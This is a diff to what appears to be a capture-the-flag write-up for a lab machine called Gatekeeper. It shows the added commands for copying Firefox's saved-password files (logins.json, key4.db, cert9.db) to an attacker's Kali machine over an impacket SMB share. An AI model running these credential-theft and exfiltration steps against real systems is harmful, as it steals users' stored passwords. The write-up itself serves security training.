@@ -819,15 +819,30 @@ except:
 
 - To perform this PrivEsc I need the following files:
 
-    1. `login.json` and `key4.db` where passwords are stored
+    1. `logins.json` and `key4.db` where passwords are stored
     2. `cert9.db` which contains all security certificate settings
 
 - These files are stored under `%APPDATA%\Mozilla\Firefox\Profiles\`
 
-    - We move to that directory and prepare to copy the files. 
+    -  `cd %APPDATA%\Mozilla\Firefox\Profiles\`
     
-    - We can set up an `smbserver` on our Kali machine to achieve this.
-   
+    - ![image](https://user-images.githubusercontent.com/94720207/169714731-026afa4c-7ae7-4384-9064-b38dc7c0a791.png)
+
+    - ![image](https://user-images.githubusercontent.com/94720207/169714810-1a16737c-b4c8-4c52-86ea-46afe9a10cde.png)
+
+- Now, I need to send the files to my Kali machine, I will setup a `smb share` between `Gatekeeper Server` and `LHOST (Kali)`
+
+- I will do a special directory for that share called `/gatekeeper_share` 
+    
+    - `/usr/share/doc/python3-impacket/examples/smbserver.py share .` 
+        
+    - ![image](https://user-images.githubusercontent.com/94720207/169715156-5417fb6f-d428-450d-83d3-cff933295081.png)
+
+- Copy the files - From Windows to Kali via SMB:
+
+    - `copy logins.json \\10.6.123.13\share` 
+    - `copy key4.db \\10.6.123.13\share` 
+    - `copy cert9.db \\10.6.123.13\share` 
 
 
 
